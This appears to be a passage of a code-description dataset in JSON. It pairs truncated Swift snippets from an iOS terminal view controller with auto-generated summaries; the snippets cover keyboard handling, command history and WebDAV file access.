    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3451",
    "code": "private func setupKeyboardNotifications() {\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(keyboardWillShow),\nname: UIResponder.keyboardWillShowNotification,\nobject: nil\n)\n\nNotificationCenter.default.addObserver(\nself,",
    "nl": "Function setupKeyboardNotifications - sets upkeyboardnotifications",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3452",
    "code": "private func setupActions() {\nlet tapGesture = UITapGestureRecognizer(target: self, action: #selector(handleTap))\nterminalOutputTextView.addGestureRecognizer(tapGesture)\n}\n\n// MARK: - Terminal Functions\n\nprivate func executeCommand(_ command: String) {",
    "nl": "Function setupActions - sets upactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3453",
    "code": "private func executeCommand(_ command: String) {\nguard !command.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else {",
    "nl": "MARK: - Terminal Functions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3454",
    "code": "private func appendToTerminalStreaming(_ text: String) {\nguard !text.isEmpty else { return }",
    "nl": "Append streaming output to terminal",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3455",
    "code": "private func appendToTerminal(_ text: String, isInput: Bool) {\nlet attributedString = NSMutableAttributedString(string: text)\n\n// Get the appropriate color based on text type and theme\nlet colorTheme = UserDefaults.standard.integer(forKey: \"terminal_color_theme\")\n\nif isInput {",
    "nl": "Function appendToTerminal - implements appendtoterminal functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3456",
    "code": "private func scrollToBottom() {\nif !terminalOutputTextView.text.isEmpty {",
    "nl": "Function scrollToBottom - implements scrolltobottom functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3457",
    "code": "@objc private func clearTerminal() {\nterminalOutputTextView.text = \"\"\nappendToTerminal(\"$ \", isInput: false)\n}\n\n@objc private func historyUp() {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3458",
    "code": "@objc private func historyUp() {\nif let previousCommand = history.getPreviousCommand() {",
    "nl": "Function historyUp - implements historyup functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3459",
    "code": "@objc private func historyDown() {\nif let nextCommand = history.getNextCommand() {",
    "nl": "Function historyDown - implements historydown functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3460",
    "code": "@objc private func insertTab() {\ncommandInputView.insertText(\"\\t\")\n}\n\n@objc private func sendCtrlC() {",
    "nl": "Function insertTab - implements inserttab functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3461",
    "code": "@objc private func sendCtrlC() {\nif isExecuting {",
    "nl": "Function sendCtrlC - implements sendctrlc functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3462",
    "code": "@objc private func handleTap() {\ncommandInputView.becomeFirstResponder()\n}\n\n@objc private func keyboardWillShow(_: Notification) {",
    "nl": "Function handleTap - implements handletap functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3463",
    "code": "@objc private func keyboardWillShow(_: Notification) {\nscrollToBottom()\n}\n\n@objc private func keyboardWillHide(_: Notification) {",
    "nl": "Function keyboardWillShow - implements keyboardwillshow functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3464",
    "code": "@objc private func keyboardWillHide(_: Notification) {\n// Handle keyboard hiding if needed\n}\n\n@objc private func dismissTerminal() {",
    "nl": "Function keyboardWillHide - implements keyboardwillhide functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3465",
    "code": "@objc private func dismissTerminal() {\n// Post notification to restore floating terminal button before dismissing\nNotificationCenter.default.post(name: .showTerminalButton, object: nil)\n\n// Also post to a more general notification that can be observed by other components\nNotificationCenter.default.post(name: Notification.Name(\"TerminalDismissed\"), object: nil)\n\n// Explicitly tell the FloatingButtonManager to show if available\nDispatchQueue.main.async {",
    "nl": "Function dismissTerminal - implements dismissterminal functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3466",
    "code": "@objc private func viewFiles() {\n// Show loading indicator\nactivityIndicator.startAnimating()\n\n// Get WebDAV credentials for the current session\ngetWebDAVCredentials { [weak self] result in",
    "nl": "MARK: - WebDAV File Access / Opens Files app with WebDAV connection to view terminal files",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3467",
    "code": "private func getWebDAVCredentials(completion: @escaping (Result<WebDAVCredentials, Error>) -> Void) {\n// First ensure we have a session\nTerminalService.shared.getCurrentSessionId { [weak self] sessionId in",
    "nl": "/ Fetches WebDAV credentials from the server",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3468",
    "code": "private func openWebDAVLocation(credentials: WebDAVCredentials) {\n// Create WebDAV URL with embedded credentials\nguard var urlComponents = URLComponents(string: credentials.url) else {",
    "nl": "/ Opens the WebDAV location in Files app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3469",
    "code": "private func createWebDAVBookmark(for url: URL, completion: @escaping (Result<URL, Error>) -> Void) {\nlet tempDir = FileManager.default.temporaryDirectory\nlet bookmarkFile = tempDir.appendingPathComponent(\"webdav_bookmark.webdavloc\")\n\nlet plistContent = \"\"\"\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>URL</key>",
    "nl": "/ Creates a temporary WebDAV bookmark file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3470",
    "code": "private func showWebDAVInstructions(credentials: WebDAVCredentials) {\n// Create alert with instructions and credentials\nlet alert = UIAlertController(\ntitle: \"Connect to Files\",\nmessage: \"\"\"\nTo access your terminal files:\n\n1. Open the Files app\n2. Tap Browse > Three dots (\u2022\u2022\u2022) > Connect to Server\n3. Enter the following:",
    "nl": "/ Show instructions for manually connecting to WebDAV",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3471",
    "code": "private func showToast(message: String) {\nlet toastLabel = UILabel()\ntoastLabel.backgroundColor = UIColor.black.withAlphaComponent(0.7)\ntoastLabel.textColor = .white\ntoastLabel.textAlignment = .center\ntoastLabel.font = UIFont.systemFont(ofSize: 14)\ntoastLabel.text = message\ntoastLabel.alpha = 0\ntoastLabel.layer.cornerRadius = 10\ntoastLabel.clipsToBounds = true",
    "nl": "MARK: - Helper Methods / Show a quick toast message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3472",
    "code": "private func showErrorAlert(title: String, message: String) {\nlet alert = UIAlertController(title: title, message: message, preferredStyle: .alert)\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\npresent(alert, animated: true)\n}\n}\n\n// MARK: - UITextFieldDelegate\n\nextension TerminalViewController: UITextFieldDelegate {",
    "nl": "/ Show error alert",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3473",
    "code": "extension TerminalViewController: UITextFieldDelegate {\nfunc textFieldShouldReturn(_ textField: UITextField) -> Bool {",
    "nl": "MARK: - UITextFieldDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3474",
    "code": "func textFieldShouldReturn(_ textField: UITextField) -> Bool {\nif let command = textField.text, !isExecuting {",
    "nl": "Function textFieldShouldReturn - implements textfieldshouldreturn functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3475",
    "code": "extension TerminalService {\n/// Get the current session ID\nfunc getCurrentSessionId(completion: @escaping (String?) -> Void) {",
    "nl": "MARK: - TerminalService Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3476",
    "code": "func getCurrentSessionId(completion: @escaping (String?) -> Void) {\n// Get current session ID from the service\n// Use the currentSessionId getter\n\nif let sessionId = TerminalService.shared.currentSessionId {",
    "nl": "/ Get the current session ID",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3477",
    "code": "@interface UISheetPresentationControllerDetent (Private)\n+ (UISheetPresentationControllerDetent *)_detentWithIdentifier:(NSString *)identifier constant:(CGFloat)constant;",
    "nl": "Function UISheetPresentationControllerDetent - implements uisheetpresentationcontrollerdetent functionality",
    "language": "cpp",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Private/UISheetPresentationControllerDetent+Private.h",
    "code_type": "function"
  }
]